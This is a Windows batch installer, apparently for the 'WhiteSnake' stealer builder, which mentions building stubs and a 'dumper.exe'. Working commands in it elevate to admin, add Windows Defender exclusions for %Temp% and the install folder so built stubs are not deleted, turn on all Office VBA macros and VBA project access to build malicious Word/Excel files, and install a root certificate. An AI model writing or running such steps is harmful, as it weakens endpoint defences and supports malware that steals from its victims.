@echo off
color b
cd /d %~dp0
title Installing WhiteSnake

:: Request admin rights (for WD exclusion)
if not "%1"=="admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'admin'"
    exit /b
)

:: Stop WhiteSnake processes
taskkill /f /im dumper.exe && timeout /t 2

:: Clean up old versions
set InstallPath=%LocalAppData%\WhiteSnake
echo [+] Removing old installation ...
rmdir /s /q %InstallPath%

:: Add exclusion to Windows Defender to prevent stub deletion while building
echo [+] Adding WD exclusion ...
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%Temp%"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%InstallPath%"

:: Enable Office macro editor (Required if you wanna build Word/Excel files)
reg ADD "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v "VBAWarnings" /t REG_DWORD /d 1 /f
reg ADD "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v "AccessVBOM" /t REG_DWORD /d 1 /f
reg ADD "HKCU\Software\Microsoft\Office\16.0\Excel\Security" /v "VBAWarnings" /t REG_DWORD /d 1 /f
reg ADD "HKCU\Software\Microsoft\Office\16.0\Excel\Security" /v "AccessVBOM" /t REG_DWORD /d 1 /f

:: Copy all files
echo [+] Copying files ...
mkdir "%InstallPath%"
xcopy data\main "%InstallPath%" /s /h /e /k /f /c /i /y

:: Python reqs
python -m pip install setuptools twine

:: Install WhiteSnake certificate
echo [+] Installing root certficate
"%InstallPath%"\certificate.cer
echo [+] Performing initialization
"%InstallPath%"\dumper.exe --init
echo.
echo [+] Installation finished
timeout /t 3